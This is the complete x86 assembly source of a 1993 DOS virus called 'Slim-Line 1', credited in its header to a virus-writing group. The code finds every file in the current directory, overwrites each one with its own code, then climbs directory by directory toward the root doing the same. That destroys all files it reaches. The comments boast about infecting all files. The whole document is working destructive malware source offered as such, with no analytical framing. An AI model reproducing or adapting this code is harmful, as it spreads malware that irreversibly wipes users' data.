;
; The Slim-Line 1 virus, from the Slim-line virus strain.
; (C) 1993 by [D‡RkR‡Y]/TridenT
;
; This one's a dumb overwriting virus, as small as possible,
; return to DOS and work with all dos versions. (no SI=100h tricks ect.)
;

_CODE   SEGMENT
        ASSUME  CS:_CODE, DS:_CODE, ES:_CODE
        ORG     100h

FIRST:
        DB      "*.*", 000h                     ; Infect ALL files..
        MOV     AH,4Eh                          ; Find first...
        XOR     CX,CX                           ; No attributes.
AGAIN:
        MOV     DX,100h                         ; String from 100h
        PUSH    DX                              ; Save 100h for later.
        INT     21h                             ; Find it!
        JC      DIR_HIGHER                      ; Not found???

        MOV     AX,3D01h                        ; Open it...
        MOV     DX,9Eh                          ; Yeah, THAT file!
        INT     21h                             ; I said NOW!
        XCHG    AX,BX                           ; Put handle in BX...

        MOV     AH,40h                          ; Infect it.
        MOV     CL,(LAST-FIRST)                 ; Thats how big I am...
        POP     DX                              ; Save it, ya remember...
        INT     21h                             ; Go get it!

        MOV     AH,3Eh                          ; Party is over,
        INT     21h                             ; close it..

        MOV     AH,4Fh                          ; Who's next!
        JMP     AGAIN

        CHD     DB      "..", 000h              ; Dir higher 8^]
DIR_HIGHER:
        MOV     AH,3Bh                          ; Change dir.
        POP     DX                              ; Don't mess with stack...
        MOV     DX,OFFSET CHD                   ; Dir higher...
        INT     21h                             ; Ok...
        JNC     FIRST                           ; Root??
EXIT:
        RET                                     ; Then exit..
LAST:

_CODE   ENDS
        END     FIRST
